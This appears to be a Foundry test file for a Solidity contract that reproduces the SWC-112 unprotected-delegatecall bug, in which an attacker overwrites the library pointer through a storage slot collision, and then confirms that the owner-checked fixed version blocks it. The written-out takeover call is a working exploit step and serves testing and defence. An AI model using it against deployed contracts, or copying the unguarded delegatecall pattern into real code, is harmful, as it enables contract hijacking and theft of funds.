// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {FibonacciBalance, FibonacciBalanceLib} from "../src/FibonacciBalance.sol";
import {FibonacciBalanceFixed, FibonacciBalanceFixedLib} from "../src/FibonacciBalanceFixed.sol";

// Differential fixture for the SWC-112 unprotected delegatecall bug.
// The vulnerable `fallback` delegatecalls ANY caller-supplied data into the
// library, running it in the contract's own storage context. The library's
// slot 0 is `start`, which in FibonacciBalance is `fibonacciLibrary`, so
// `setStart` lets anyone overwrite the library pointer. The fixed variant
// guards the fallback with an owner check.
contract FibonacciBalanceFixtureTest is Test {
    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
    }

    function test_fixtureReproduces() public {
        FibonacciBalanceLib lib = new FibonacciBalanceLib();
        FibonacciBalance fb = new FibonacciBalance(address(lib));
        assertEq(fb.fibonacciLibrary(), address(lib), "library pointer set at deployment");

        // Library slot 0 is `start`; in FibonacciBalance slot 0 is `fibonacciLibrary`.
        // Forwarding setStart() via the fallback overwrites that slot.
        uint256 evil = uint256(uint160(attacker));

        vm.prank(attacker);
        (bool ok, ) = address(fb).call(abi.encodeWithSignature("setStart(uint256)", evil));
        assertTrue(ok, "fallback forwarded setStart to the library");

        assertEq(fb.fibonacciLibrary(), attacker, "fibonacciLibrary slot overwritten via delegatecall");
    }

    function test_fixtureDoesNotReproduce() public {
        FibonacciBalanceFixedLib lib = new FibonacciBalanceFixedLib();
        FibonacciBalanceFixed fb = new FibonacciBalanceFixed(address(lib));
        address before = fb.fibonacciLibrary();
        assertEq(before, address(lib), "library pointer set at deployment");

        uint256 evil = uint256(uint160(attacker));

        vm.prank(attacker);
        (bool ok, ) = address(fb).call(abi.encodeWithSignature("setStart(uint256)", evil));
        assertFalse(ok, "fallback reverted: msg.sender != owner");

        assertEq(fb.fibonacciLibrary(), before, "fibonacciLibrary slot unchanged");
    }
}
